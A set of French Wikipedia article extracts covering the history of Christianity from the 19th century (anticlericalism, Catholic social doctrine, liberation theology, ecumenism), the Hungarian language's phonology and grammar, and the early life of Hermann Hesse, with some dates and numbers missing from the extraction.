En France, la politique pro-cléricale de la Restauration (loi Bonald abolissant le divorce, loi sur le sacrilège punissant ce dernier de la peine capitale, etc.) est emportée par la révolution de 1830. La question religieuse continue toutefois de faire débat tout au long du et même après, de la loi Falloux de 1850 favorisant l'enseignement confessionnel, à la loi de séparation des Églises et de l'État de 1905 en passant par les lois Jules Ferry sur l'éducation laïque, gratuite et obligatoire.
Les États pontificaux, dernier vestige du pouvoir temporel de la papauté, sont absorbés par le nouvel État italien, et à partir de 1870, le pape se considère comme prisonnier dans la Cité du Vatican. Cette affaire ne sera réglée que sous Mussolini par les accords du Latran (1929).
En 1864, publie l’encyclique "Quanta Cura ", à laquelle s’ajoute le "Syllabus", qui condamne sans appel modernes ». De nombreux ouvrages suspectés de « modernisme » sont mis à l’Index. Cette tendance se confirme lors du premier concile œcuménique du Vatican (1870), dont la principale décision est de proclamer l’infaillibilité pontificale (encyclique "Pastor Æternus") : le pape, lorsqu'il parle "ex cathedra" et en tant que docteur suprême de l'Église, ne peut, selon ce dogme, se tromper. Certains évêques sont en désaccord avec les décisions, ce qui donne lieu à un schisme dans la seconde moitié du : celui de l'Église vieille-catholique.
L’Église catholique doit affronter des courants intellectuels athées et anticléricaux. En France, le positivisme d’Auguste Comte secoue les fondements de la métaphysique et de la religion. Des penseurs tels que David Strauss ou Ernest Renan lancent la quête du Jésus historique et fondent les sciences religieuses ainsi que l'exégèse critique de la Bible. Les progrès des sciences naturelles, en géologie et en paléontologie notamment, symbolisés par la publication en 1859 de "De l'origine des espèces" de Darwin, invalident la lecture littérale de la Bible. Face à cet effritement, la papauté réagit par un raidissement doctrinal et répond par le serment antimoderniste qui encourage le fondamentalisme.
En réaction à l'infaillibilité pontificale d'une part et d'autre part à l'évolution de la lecture de la Bible, les Églises conservatrices américaines se réunissent à leur tour en Églises fondamentalistes.
Après la crise moderniste des premières années du , le débat sur le modernisme dans l'Église catholique se poursuit jusqu'au concile (1963-1965), lancé par et poursuivi par .
Le christianisme et la question sociale.
La doctrine sociale de l'Église catholique.
Les problèmes sociaux consécutifs à la révolution industrielle (révolte des Canuts…) poussèrent les chrétiens et l’Église catholique à un renouvellement de leur pensée sociale. En effet, les profondes transformations économiques, sociales et politiques ne permettaient plus aux chrétiens et aux structures existantes de l’Église catholique d’exercer la charité dans les mêmes conditions. Il fallait refonder l’action sociale. Les premiers à contester l’idée que la misère était inévitable et même nécessaire furent des ecclésiastiques et des penseurs catholiques. On peut citer Frédéric Ozanam et Lamennais en France, Wilhelm von Ketteler en Allemagne.
Certains de ces penseurs furent d’abord condamnés par l’autorité religieuse. Il faut distinguer différentes attitudes, celle des individus (prêtres, intellectuels catholiques), celle des Églises nationales et des partis politiques qui y sont liés, et celle du pape. Peu à peu, une position officielle de l’Église par rapport au problème social prit forme. Elle aboutit en 1891 à la promulgation de l’encyclique "Rerum novarum" par la plus haute autorité de l’Église, le pape . Cette attitude obligea les Églises nationales à modifier leur point de vue et à admettre que des mesures politiques étaient nécessaires pour soulager la misère. Au niveau politique, ce nouveau courant finit par donner naissance à diverses formations politiques qui se rassembleront ultérieurement sous le nom de démocratie chrétienne. Celle-ci fut longtemps combattue par une partie importante des catholiques et par l’épiscopat.
Théologie de la libération.
Dans les années 1960 en Amérique latine, l’ampleur des inégalités sociales et la violence des luttes incite des ecclésiastiques catholiques à soutenir les combats pour la « libération des pauvres », y compris par la révolution qui, dans cette aire culturelle, est essentiellement marxiste-léniniste, donc en théorie athée. Ce courant, dénommé « théologie de la libération » soutient qu’existe, à côté du péché personnel, un péché collectif et structurel, c’est-à-dire un aménagement de la société et de l’économie qui cause la souffrance d’innombrables « frères et sœurs humains ».
Au cours des années 1960 et 1970, des régimes militaires ont été établis dans la plupart des pays d’Amérique latine. Alors que la hiérarchie ecclésiastique soutient le plus souvent les dictatures en place, les militants de la théologie de la libération participent activement à la résistance contre ces dictatures et contribuent à leur déclin à partir des années 1980. Ils ont été un facteur important, sinon décisif, de la démocratisation de ces États. En Colombie, plusieurs prêtres s’engagent dans les guérillas paysannes. Parmi eux, Camillo Torres, qui meurt au combat en 1966, et Manuel Pérez, qui commande la guérilla de l’ELN ("Ejército de Liberación Nacional") au cours des années 1980.
Au Salvador, l’archevêque Oscar Romero est tué par des paramilitaires en . Ignacio Ellacuria et ses cinq collègues jésuites de l’Université centre-américaine d’El Salvador sont assassinés en par l’armée gouvernementale. En Argentine, certains prêtres sont torturés à mort sous le régime de Jorge Videla.
Les Églises protestantes depuis la Réforme.
Sciences religieuses et libéralisme théologique.
Les sciences religieuses se classent parmi les sciences humaines et sociales. L'expression est souvent usitée au pluriel car il s'agit d'approches pluridisciplinaires mais non théologiques du fait religieux en sociologie, anthropologie, psychologie, philosophie, art, histoire littéraire, philologie, linguistique, exégèse ou archéologie. Le droit et les sciences politiques peuvent également être associés aux sciences religieuses lorsqu'il s'agit d'étudier comment les sociétés régulent, de façons très diverses, le fait religieux, allant du statut des institutions et des communautés déclarées croyantes (comme les républiques islamiques) à celui des accommodements raisonnables comme la laïcité. En 1885 l'école pratique des hautes études fut la première en France à créer une section de sciences religieuses. Les sciences religieuses n'ont de rapports avec la théologie que pour éclairer la compréhension de certaines manifestations phénoménologiques.
Le « libéralisme théologique », lui, a été décrit comme une interprétation de moins en moins littérale des textes sacrés, prenant en compte les apports des sciences religieuses, selon l'aphorisme de 1862 du bibliste .
L'histoire des religions est un intérêt objectivant pour les traditions religieuses, dans une tradition comparatiste. La mise à distance historique a permis de traiter la diversité des faits religieux comme une réalité non polémique. Évitant toute folklorisation du religieux, d'autres disciplines analysent le fait religieux comme une réalité vivante spécifique, à la fois englobée et distincte des "cultural studies". La sociologie des religions est la branche des sciences religieuses qui étudie les aspects quantitatifs (comme la géographie) et la phénoménologie des religions (comme l'anthropologie le fait dans les sociétés premières). La question de la place en sciences religieuses d'une approche des théologies comparées, vide à élucider les invariants ou les singularités herméneutiques de chaque tradition.
L'œcuménisme.
Depuis le , dans le but de surmonter leurs divisions, des chrétiens amorcent un rapprochement, dans le respect des aspirations de chacun, appelé œcuménisme.
La première tentative de nouer un dialogue global interconfessionnel a été le Parlement des religions du monde, qui s'est réuni à Chicago du 11 au , à l'occasion de l'exposition universelle de Chicago ou "". Il était coordonné par un chrétien unitarien, (1843-1918).
On fait généralement remonter le départ de l'œcuménisme moderne à la Conférence internationale des Missions qui s'est tenue à Édimbourg en 1910, présidée par le laïc américain John Mott.
La conférence de Stockholm en 1925 rassemble anglicans, protestants, et chrétiens orthodoxes, sous l'égide de l'archevêque luthérien suédois Nathan Söderblom. Elle aboutit à la constitution du mouvement œcuménique « Life and Work » qui préfigure le Conseil œcuménique des Églises. Le Vatican est cependant absent.
Prévue initialement pour 1941, la création du Conseil œcuménique des Églises (COE) fut retardée par la guerre de 1939-1945 et par l’opposition de l’Église catholique. L'assemblée constitutive du COE s'est tenue en 1948, à Amsterdam. Dans sa première déclaration commune - rédigée à Utrecht et acceptée à Amsterdam -, le COE se présente tout d'abord comme « une communauté ["fellowship" (sic)] d'Églises qui acceptent notre Seigneur Jésus-Christ comme Dieu et Sauveur ». Le premier président du COE fut Willem Visser 't Hooft, de 1948 à 1966.
L’œcuménisme entre les catholiques et les « frères séparés » a pris son essor dans la seconde moitié du , particulièrement à la suite du concile Vatican II (1962-1965) qui institutionnalise l’œcuménisme par le "Décret sur l’œcuménisme" ("Unitatis Redintegratio") de 1964 qui reconnait le côté chrétien du protestantisme et favorise la poursuite du dialogue. Le théologien dominicain Yves Congar fut l'artisan du ralliement de l'Église catholique au mouvement œcuménique lors du concile Vatican II.
Dans son encyclique "Ut unum sint", le pape réaffirme l'engagement œcuménique irréversible de l'Église catholique : .
L'œcuménisme se concrétise aujourd'hui par la traduction commune des textes saints (Traduction œcuménique de la Bible), la Semaine de prière pour l'unité des chrétiens (créée dès 1908), qui se tient chaque année du 18 au 25 janvier, et par plusieurs initiatives communes en vue de la sauvegarde de la Création (Temps pour la Création, Église verte) ou de l'évangélisation (Parcours Alpha).

</doc>
<doc id="1445" url="https://fr.wikipedia.org/wiki?curid=1445" title="Hongrois">
Hongrois

 
Le hongrois ou la langue hongroise (hongrois : "magyar nyelv" ) est une langue de la branche ougrienne des langues finno-ougriennes au sein de la famille des langues ouraliennes. Ses parentes les plus proches sont le khanty (ou "ostiak") et le mansi (ou "vogoul") en tant que langues ougriennes, et des parentes plus éloignées sont le finnois et l'estonien, appartenant à la branche finno-permienne des langues finno-ougriennes. Il est parlé par environ de personnes, dont vivent en Hongrie. Il existe aussi des communautés magyarophones dans tous les pays voisins de la Hongrie (Roumanie, Slovaquie, Serbie, Ukraine, Autriche, Croatie et Slovénie), ainsi que d’importantes communautés apparues par émigration aux États-Unis, au Canada, en Israël
Par sa morphologie, le hongrois est typologiquement une langue agglutinante. Sa phonologie est caractérisée par l'harmonie vocalique. À côté de son vocabulaire hérité ou développé en interne, le hongrois a emprunté historiquement des mots aux langues turciques, aux indo-iraniennes, aux langues slaves, au latin, à l'allemand et à quelques autres langues.
Le hongrois s'écrit depuis le dans une forme adaptée de l’alphabet latin, qui a progressivement remplacé l'alphabet runique hongrois. Ce dernier est en revanche de plus en plus utilisé partout dans les régions magyarophones depuis sa « redécouverte » dans les années 1980.
Répartition géographique et statut.
Sur les de locuteurs du hongrois, vivent en Hongrie, où le hongrois est langue officielle. Cette langue a le même statut en Slovénie (), à côté du slovène, dans les localités où il y a des « communautés nationales » hongroises. Quant à l'importance du nombre de locuteurs, le deuxième pays est la Roumanie, avec de langue maternelle. Dans ce pays, le hongrois peut être utilisé dans l'administration locale, dans les localités où le poids des personnes appartenant à la minorité hongroise dépasse les 20 %. En Serbie (), dans la province de Voïvodine, le hongrois est dit « d'usage officiel » dans les localités où la population magyarophone atteint 15 % de la population totale. En Slovaquie (), en Ukraine dans la région de Transcarpathie (), en Autriche () et en Croatie (), le hongrois est une langue minoritaire reconnue.
En dehors des pays voisins de la Hongrie, où les Hongrois ont un statut de minorité nationale, il y a beaucoup de locuteurs de hongrois dans la diaspora. Les communautés les plus nombreuses se trouvent aux États-Unis (), au Canada () et en Israël ().
Histoire externe.
L'histoire du hongrois commence il y a quelque , à l'est de l'Oural, dans la région du fleuve Ob. Dès cette époque-là et par la suite, au cours de la migration des Hongrois vers le sud-ouest, leur langue est influencée par des langues turciques et iraniennes. Après leur établissement dans le bassin des Carpates, l'adoption du christianisme et la fondation du royaume de Hongrie, le hongrois est influencé par des langues slaves et par le latin, langue par laquelle commence la culture écrite en Hongrie.
La première attestation écrite du hongrois date du . Ce sont quelques phrases et mots isolés, dans la lettre de fondation de l'abbaye de Tihany.
Au paraît le premier texte complet en hongrois, "Halotti beszéd és könyörgés" (Discours funèbre et prière) et, au , la première œuvre littéraire, le poème "Ómagyar Mária-siralom" (Plainte de la Vierge Marie en ancien hongrois).
Au , la langue se développe grâce à la littérature profane, mais surtout aux premières œuvres imprimées en hongrois, des traductions de textes bibliques initiées par l'Église catholique et par des protestants. Au même siècle paraissent les premiers ouvrages linguistiques concernant le hongrois.
Aux , dans la principauté de Transylvanie, le hongrois devient pour la première fois langue de l'État. Les codes de lois "Compilatae Constitutiones Regni Transylvaniae" (1671) et "Approbatae Constitutiones Regni Transylvaniae" (1677) sont rédigés en hongrois.
Au , la langue nationale unitaire est formée et les normes de la langue standard sont fixées par des lettrés adeptes du mouvement appelé « renouveau de la langue », qui tend à éliminer les influences latines et allemandes, ainsi que par les ouvrages normatifs de la Société scientifique hongroise. D'abord entre 1844 et 1849, puis définitivement en 1867, le hongrois devient langue officielle.
Dialectes.
Les dialectes du hongrois sont groupés en dix régions dialectales, chacune comportant plusieurs groupes de dialectes :
Phonologie et graphie.
Le système phonologique du hongrois standard est formé de sept paires de voyelles, une brève et une longue par paire, et de , chacune pouvant être brève ou longue. L'opposition brève – longue a une valeur fonctionnelle : le sens des mots peut être différencié par la quantité d'une voyelle ou d'une consonne.
Le hongrois se caractérise par l'harmonie vocalique, c'est-à-dire, en général, un mot ne contient que des voyelles ayant un certain trait : elles sont, sauf exception, soit antérieures, soit postérieures.
En hongrois, l'accent est tonique (appelé aussi d'intensité), plus marqué qu'en français. Les mots relativement longs peuvent comporter plusieurs accents, dont l'un principal. L'accent unique ou principal frappe toujours la première syllabe des mots.
L'écriture du hongrois est phonémique dans une grande mesure. Sauf de rares exceptions, un graphème correspond toujours au même phonème.
Quelques signes diacritiques sont utilisés pour des graphèmes notant des voyelles : l'accent aigu servant à noter les voyelles longues ("á", "é", "í", "ó", "ú"), le tréma ("ö", "ü") qui définit d'autres voyelles courtes (les voyelles arrondies antérieures, inexistantes en latin) et le double accent aigu ("ő", "ű") qui note leurs homologues longues et qui peut donc être considéré comme un tréma long, puisqu'il ne modifie que la longueur d'une voyelle à tréma.
Certaines consonnes sont notées à l'aide de digrammes ( – "cs", – "dz", – "gy", l'une des graphies de – "ly", – "ny", – "sz", – "ty" et – "zs") ou d'un trigramme ( – "dzs").
L'alphabet hongrois compte 44 lettres dont non accentuées, neuf lettres accentuées, huit digrammes et un trigramme. Il est ordonné ainsi :
A a, Á á, B b, C c, Cs cs, D d, Dz dz, Dzs dzs, E e, É é, F f, G g, Gy gy, H h, I i, Í í, J j, K k, L l, Ly ly, M m, N n, Ny ny, O o, Ó ó, Ö ö, Ő ő, P p, Q q, R r, S s, Sz sz, T t, Ty ty, U u, Ú ú, Ü ü, Ű ű, V v, W w, X x, Y y, Z z, Zs zs.
Le caractère agglutinant du hongrois.
Du fait que le hongrois est une langue agglutinante, elle se différencie des langues indo-européennes, mais se rapproche d'autres langues de sa famille, et même de langues d'autres familles encore, comme le turc ou le japonais. Le caractère agglutinant consiste en ce que les morphèmes sont des affixes (préfixes et suffixes) qu'on attache aux mots radicaux, souvent plusieurs suffixes l'un après l'autre, de façon que les limites entre eux restent nettes, chacun correspondant à un seul trait sémantique ou fonctionnel.
Les linguistes qui étudient le hongrois utilisent des termes différents pour les différents types de suffixes. Le suffixe dérivatif s'appelle "képző" et les suffixes grammaticaux sont de deux sortes. Ceux qui s'ajoutent à un radical ou à un suffixe dérivatif et peuvent être suivis d'un autre suffixe grammatical, s'appellent "jel" « marque, signe ». De tels suffixes sont ceux qui indiquent le pluriel, et les suffixes possessifs. Ceux qui expriment les cas grammaticaux et ceux qui indiquent la personne du verbe, c'est-à-dire les désinences, s'appellent "ragok" (au singulier "rag"). Ils se distinguent des autres types de suffixes par le fait qu'il est impossible de leur attacher un autre suffixe.
Exemple de mot à suffixes : "házaimban" « dans mes maisons », formé du radical "ház" « maison », la voyelle de liaison "-a-", le suffixe "-i" indiquant le pluriel des objets possédés, le suffixe "-m" indiquant la du singulier du possesseur, et le suffixe "-ban" correspondant à la préposition française « dans ».
Les suffixes se succèdent en un ordre qui suit des règles précises. Par exemple, dans le cas des noms, les suffixes dérivatifs s'attachent au radical du mot ou à un autre suffixe dérivatif, étant suivis des suffixes grammaticaux, dont le suffixe casuel est toujours le dernier. Il peut être précédé de :
Grammaire.
Morphologie.
Classification morphologique des mots.
Keszler 2000 classe les mots selon leur nature comme suit :
Les suffixes personnels.
En hongrois, les personnes s'expriment par les pronoms personnels et par des suffixes spécifiques, qui ont plusieurs fonctions, s'appliquant :
Le verbe.
Concernant le verbe, les grammaires du hongrois prennent en compte les traits grammaticaux suivants : diathèse, mode, temps, nombre (singulier et pluriel) et personne. Par rapport au français, tout comme pour les autres types de mots, il manque au verbe le genre.
Une caractéristique importante du système verbal hongrois, c'est l'existence de deux séries de conjugaison pour les verbes transitifs directs : une conjugaison appelée « objective » (ou « définie »), et une autre dite « subjective » (ou « indéfinie »).
Le nom, l'adjectif et le numéral.
Le nom ne peut exprimer que le genre naturel, le genre grammatical n'étant pas indiqué en hongrois.
Il comporte aussi le trait grammatical du nombre, bien que le pluriel ne soit pas toujours exprimé par le même suffixe. La marque du pluriel des noms en général est "-k", alors que celle des objets possédés est "-i" : "a gyerekek" « les enfants » mais "a gyerekei" « ses enfants ».
En général, on considère que le paradigme casuel hongrois comprend . Le système casuel du hongrois est très riche pour ce qui est de l'expression des rapports spatiaux, ayant trois cas différents pour faire la différence entre le lieu où un procès a lieu, celui vers lequel un déplacement est effectué et celui depuis lequel un déplacement est effectué. Exemple : "a házban van" « il/elle est dans la maison » – "bemegy a házba « il/elle entre dans la maison » – "kimegy a házból « il/elle sort de la maison ».
Le hongrois n'ayant pas d'adjectif possessif, la possession est exprimée à l'aide de suffixes, certains qui sont ajoutés à l'objet possédé et deux autres qui s'appliquent au possesseur. Les constructions par lesquelles on exprime la possession, le possesseur et l'objet possédé étant exprimés par des noms, sont les suivantes :
L'adjectif qualificatif présente la particularité de ne pas s'accorder en nombre dans la fonction d'épithète, mais seulement dans celle d'attribut.
Le numéral cardinal a généralement deux formes, par exemple "három" et "hármas" « trois ». La première est utilisée pour compter, en tant que complément d'un nom ou lorsque ce nom est sous-entendu, ainsi que pour désigner un chiffre dans un nombre. La deuxième forme est l'appellation du chiffre en cause ou du nombre dont ce chiffre est l'unité. Les grammaires hongroises incluent dans la classe des numéraux ce qu'elles appellent « numéraux indéfinis », tels "sok" « beaucoup », "kevés" « peu », "számos" « nombreux, -euse », etc. Le numéral peut aussi prendre des formes adverbiales si on lui ajoute certains suffixes : "öten" « cinq » (le nombre de personnes participant à une action), "kettesben" « à deux » (l'intimité de personnes limitée au nombre en question).
L'adverbe.
Le principal trait spécifique de l'adverbe hongrois par rapport au français, est un système triple d'expression du lieu, comme pour certains suffixes casuels : le lieu où un procès a lieu, celui vers lequel et celui depuis lequel un déplacement est effectué. Exemple : "bent" ou "benn" « dedans, à l'intérieur » (complément de verbes qui n'expriment pas le déplacement vers ou depuis un intérieur) – "be" « dedans, vers l'intérieur » (auprès de verbes qui expriment le déplacement vers un intérieur) – "bentről" « du dedans, de l'intérieur » (auprès de verbes qui expriment le déplacement depuis un intérieur).
Les pronoms.
Les grammaires du hongrois prennent en compte neuf espèces de pronoms : personnels, réfléchis, de réciprocité, possessifs, démonstratifs, interrogatifs, relatifs, indéfinis et généraux.
En fonction du type de mots qu'ils remplacent, les pronoms sont classés en substantivaux, adjectivaux et numéraux.
Les adjectifs pronominaux ne sont pas distingués des pronoms.
Les pronoms personnels présentent une particularité notable. Seul l'accusatif est constitué de la forme de nominatif + le suffixe casuel spécifique. Les autres sont des suffixes casuels auxquels on ajoute les mêmes suffixes personnels que ceux appliqués à l'objet possédé. Exemple : "én" « je, moi », "nálam" « chez moi », "velem" « avec moi », etc.
À la différence du français, en hongrois il n'y a pas d'adjectifs possessifs, mais seulement des pronoms possessifs. La fonction des adjectifs est remplie par des suffixes ajoutés à l'objet possédé (voir plus haut #Le nom, l'adjectif et le numéral).
Les mots grammaticaux.
On considère comme des verbes auxiliaires non seulement ceux qui forment des temps verbaux composés, mais on prend également en compte des auxiliaires aspectuels, modaux et pragmatiques. On inclut dans la même classe les verbes copulatifs. Il y a aussi des verbes appelés « quasi-auxiliaires », dont le sens grammatical est prédominant, mais ils ont aussi un sens lexical plus ou moins marqué. Ces verbes peuvent être, d'une part, des verbes de modalité et d'aspect, d'autre part, des verbes appelés « fonctionnels », utilisés en association avec des types de mots nominaux qui sont formellement leurs compléments.
Les formes nominales des verbes copulatifs sont considérées comme des types de mots à part dans les grammaires du hongrois, au même titre que les formes nominales du verbe en général (voir plus haut #Le verbe).
Les postpositions sont des mots grammaticaux qui constituent l'un des moyens d'expression des fonctions syntaxiques qui s'appellent en grammaire du français compléments d'objets indirects et compléments circonstanciels. Elles correspondent généralement aux prépositions et locutions prépositives du français (exemple : "a fa alatt" « sous l'arbre »).
Les adjectifs dérivés de postpositions ne sont que formellement des adjectifs. Ils n'ont pas de sens lexical, mais remplissent la fonction des postpositions dont ils dérivent, formant des compléments de nom avec les noms après lesquels ils se placent (exemple : "a fa alatti pad" « le banc sous l'arbre »).
Le seul mot hongrois qui fonctionne comme une préposition est "mint" « comme, en tant que », par exemple dans "Mint mérnök dolgozik" « Il travaille comme ingénieur ».
Les verbes hongrois sont souvent munis de préfixes ayant une nature partiellement différente des préfixes que peuvent avoir les verbes français. D'un côté, les préfixes hongrois ont une fonction grammaticale et lexicale, d'un autre côté, ils doivent être séparés du verbe dans certains cas, voire parfois placés après celui-ci.
Les conjonctions hongroises ont la même fonction que celles du français.
La particule est, dans les grammaires du hongrois, « un mot grammatical qui ne peut accepter d'affixes, ne réalise de rapports ni morphologiques ni syntaxiques avec d'autres mots, ne peut être terme de la phrase simple […]. Elle a la fonction d'effectuer des opérations sur l'affirmation de la phrase […] ; elle exprime un rapport modal, l'attitude du locuteur (sa façon de se rapporter d'un point de vue affectif, volitif, axiologique, ou bien elle marque la réaction du locuteur à la situation de communication ou à une composante de celle-ci […]. ».
Les articles pris en compte par les grammaires hongroises sont l'article défini et l'article indéfini, qui ont les mêmes fonctions qu'en français.
À la différence des grammaires du français, dans celles du hongrois les mots de négation ne sont pas inclus dans la classe des adverbes, mais forment une classe à part dans la catégorie des mots grammaticaux.
Les mots-phrases.
Cette catégorie de mots, qui ne comprend pas les verbes, se caractérise par leur capacité à constituer à eux seuls une phrase simple.
Outre les interjections et les onomatopées, présentes également dans les grammaires du français, les grammaires du hongrois prennent en compte deux autres classes de mots.
Les mots-phrases d'interaction sont utilisés pour interagir avec le destinataire de la communication. Cette classe comprend des formules de salutation ("szervusz" « salut »), des mots affirmatifs ("igen" « oui »), des mots négatifs ("nem" « non ») et des mots injonctifs ("rajta!" « allez ! »).
Les modalisateurs ne participent à des rapports syntaxiques avec aucun terme de la phrase simple, mais indiquent l'attitude du locuteur à l'égard du contenu de l'énoncé entier où ils sont utilisés. Ce sont celles des particules (voir plus haut Les mots grammaticaux) qui peuvent constituer à elles seules une phrase simple. De tels mots sont "talán" « peut-être », "valószínűleg" « vraisemblablement », "esetleg" « éventuellement », "állítólag" « on le dit », etc.
Syntaxe.
La phrase simple.
Nous présentons la syntaxe du hongrois à l'aide de la terminologie hongroise transposée en français. Les fonctions syntaxiques dans la phrase simple sont le verbe, le sujet, l'objet, le complément de lieu, de temps, numérique, d'état, d'origine, de résultat, d'accompagnement, de manière, de cause, de but, de relation, de degré/mesure, de moyen, d'attribution et de comparaison, les compléments asémantiques (ou permanents) et l'épithète.
L'épithète se place devant le terme déterminé et ne s'accorde pas avec celui-ci.
Dans la phrase simple, l'ordre des mots est très varié, en fonction du mot ou du syntagme qu'on veut mettre en relief.
La phrase complexe.
Les propositions coordonnées peuvent être liées entre elles par juxtaposition ou par une conjonction. La coordination peut être copulative, adversative, disjonctive, consécutive ou explicative.
Une caractéristique importante des propositions subordonnées en hongrois est qu'elles ont très souvent un antécédent exprimé par un pronom dans la proposition principale, et la subordonnée complète cet antécédent.
Dans la phrase complexe hongroise il peut y avoir des subordonnées sujet, prédicat, objet, des subordonnées compléments (de lieu, temporelle, numérique, d'état, d'origine, de résultat, d'accompagnement, de manière, de cause, de but, de relation, de degré/mesure, de moyen, d'attribution, de comparaison), des subordonnées compléments permanents, des subordonnées à contenu sémantique spécial (consécutive, conditionnelle, concessive et comparative) et des subordonnées épithète.
Lexique.
Le lexique hongrois provient principalement (80 %) de formations lexicales internes, le reste étant constitué de mots hérités (8 %) et d'emprunts (7 %). L'étymologie de 5 % du vocabulaire reste inconnue.
La plupart des emprunts sont d'origine slave (27 %), latine (25 %), allemande (17 %) et turcique. On trouve aussi des emprunts à des langues iraniennes, romanes (italien, français, roumain), et à l'anglais. Les calques sont également une source importante d'enrichissement du lexique.
Les moyens internes d'enrichissement du lexique sont de loin les plus utilisés. Parmi ceux-ci, les plus productifs sont la création spontanée de mots (interjections, mots onomatopéiques, créations expressives), la formation spontanée de mots par dérivation et par composition, ainsi que la création consciente de vocables par les deux derniers procédés. Par rapport au français, la composition spontanée et la création consciente ont une importance beaucoup plus grande.

</doc>
<doc id="1446" url="https://fr.wikipedia.org/wiki?curid=1446" title="Hermann Hesse">
Hermann Hesse

Hermann Hesse, né le à Calw dans le royaume de Wurtemberg (Empire allemand) et mort le à Montagnola (Suisse), est un romancier, poète, peintre et essayiste allemand puis, à partir de 1924, suisse. Il obtint le prix Bauernfeld en 1905, le prix Gottfried Keller en 1936 et, en 1946, le prix Goethe ainsi que le prix Nobel de littérature.
Enfance et jeunesse.
Hermann Karl Hesse est issu d'une famille de missionnaires chrétiens de confession protestante. Ses parents furent tous deux engagés pour la Mission de Bâle en Inde, où sa mère, , était née en 1842. Son père, , né en 1847 dans la famille d'un médecin, était d'origine germano-balte et la famille vécut à Weissenstein (aujourd'hui Paide en Estonie). Dans la petite ville de Calw, en Forêt-Noire, la famille tint à partir de 1873 une maison d'édition missionnaire sous la direction du grand-père maternel de Hesse, Hermann Gundert. Hermann eut huit frères et sœurs, dont trois moururent prématurément. Il grandit avec Adèle, Marulla et Hans Hesse, ainsi qu'avec leurs deux demi-frères, Theodore et Karl Isenberg, que leur mère avait eus avec son premier mari Charles Isenberg.
Le monde dans lequel Hermann Hesse vécut ses premières années était totalement imprégné de l'esprit du piétisme souabe. En 1881, la famille s'installe à Bâle pour cinq années, mais revient ensuite à Calw. Après avoir achevé ses études latines avec succès à Göppingen, Hesse rejoint en 1891 le séminaire protestant de Maulbronn (dont il fera le cadre de son roman "L'Ornière"). Là se révèle en mars 1892 son caractère rebelle : échappé un jour du séminaire, le garçon de quinze ans ne sera rattrapé que le lendemain, en pleine nature.
Dès lors, sur fond de violents conflits avec ses parents, commence une odyssée à travers divers établissements et écoles. Hermann Hesse était en fait dans une phase dépressive de son trouble bipolaire, au point d'exprimer dans une lettre du des pensées suicidaires (« Je voudrais partir comme le coucher de soleil »). En mai suivant, il fait une tentative de suicide dans l'établissement de Bad Boll dirigé par le théologien et directeur de conscience, Christoph Friedrich Blumhardt. À la suite de cela, Hermann est placé dans la maison de santé de Stetten im Remstal, et plus tard dans un établissement pour enfants à Bâle. Fin 1892, il entre au lycée de Cannstatt, à Stuttgart. En 1893, il y obtient son diplôme probatoire de première année, mais interrompt ses études.
Il commence alors à Esslingen am Neckar un apprentissage de libraire qu'il abandonne après trois jours, puis devient au début de l'été 1894 apprenti mécanicien pour quatorze mois, dans la fabrique d'horloges Perrot à Calw. Le travail monotone de soudage et de limage renforce chez Hermann Hesse le désir de se tourner à nouveau vers une activité spirituelle. En octobre 1895, il se sent prêt à entamer un nouvel apprentissage de libraire, à Tübingen, et à s'y consacrer sérieusement. Plus tard, il relatera ces péripéties de son enfance dans son roman "L'Ornière" ("").
La naissance d'un écrivain.
Hesse travaille, à partir du , dans la librairie Heckenhauer à Tübingen. L'essentiel du fonds traitait de théologie, de philosophie et de droit. La tâche de l'apprenti Hesse consistait à collationner, emballer, classer et archiver les livres. Après sa journée de travail de douze heures, il continue à enrichir sa culture en solitaire, et les livres compensent encore son absence de contacts sociaux pendant les longs dimanches fériés. Hesse lit des écrits théologiques, puis l'œuvre de Goethe, et plus tard Lessing, Schiller et des textes de la mythologie grecque. En 1896, son poème "Madonna" est publié dans une revue viennoise.
En 1898, il devient assistant libraire et dispose désormais d'un revenu respectable, lui assurant une indépendance financière vis-à-vis de ses parents. À cette époque, il lit surtout les œuvres des romantiques allemands, et tout particulièrement de Clemens Brentano, Joseph von Eichendorff et Novalis. Dans une lettre à ses parents, il exprime sa conviction que « la morale est chez les artistes remplacée par l'esthétique ». Alors qu'il était toujours libraire, Hesse publie, à l'automne 1898, son premier petit recueil de poèmes, "Romantische Lieder" ("Chants romantiques"), et à l'été 1899 le recueil en prose "Eine Stunde hinter Mitternacht" ("Une heure après minuit"). Les deux ouvrages furent des échecs commerciaux. En l'espace de deux ans, seuls cinquante-quatre des six cents exemplaires de "Romantische Lieder" seront vendus. "Eine Stunde hinter Mitternacht" est également tiré à seulement six cents exemplaires et ne se vendit que très lentement. L'éditeur leipzigois est cependant convaincu de la valeur littéraire de l'œuvre, et voit ces publications dès le départ comme des encouragements pour le jeune auteur, plutôt que comme une entreprise rentable.
Déménagement en Suisse.
À partir de l'automne 1899, Hesse travaille dans une librairie d'occasion à Bâle. Ses parents ayant d'étroits contacts avec les familles bâloises érudites, un royaume spirituel et artistique des plus stimulants s'ouvre à lui. En même temps, le promeneur solitaire qu'est Hesse trouve à Bâle l'occasion de retraites grâce aux nombreuses possibilités de voyages et promenades, ce qui sert sa quête artistique personnelle, en développant en lui l'aptitude à transcrire littérairement une observation sensorielle, aptitude sans cesse confrontée à une aventure nouvelle. En 1900, Hesse est exempté du service militaire en raison de sa faible vue. Ses difficultés de vision dureront toute sa vie, de même que sa névralgie et ses maux de tête.
En 1901, Hesse peut réaliser l'un de ses grands rêves en voyageant pour la première fois en Italie. La même année, il entre chez un nouvel employeur, le libraire Wattenwyl, à Bâle. À la même époque, les occasions de publier des poèmes et de petits textes littéraires dans des revues se multiplient et, désormais, les rémunérations de ces publications contribuent à ses revenus. Très vite, l'éditeur s'intéresse à lui, et le roman "Peter Camenzind", pré-publié en 1903 et publié officiellement en 1904 chez Fischer, marque une rupture : Hesse peut maintenant vivre de sa plume.
Entre le lac de Constance et l'Inde.
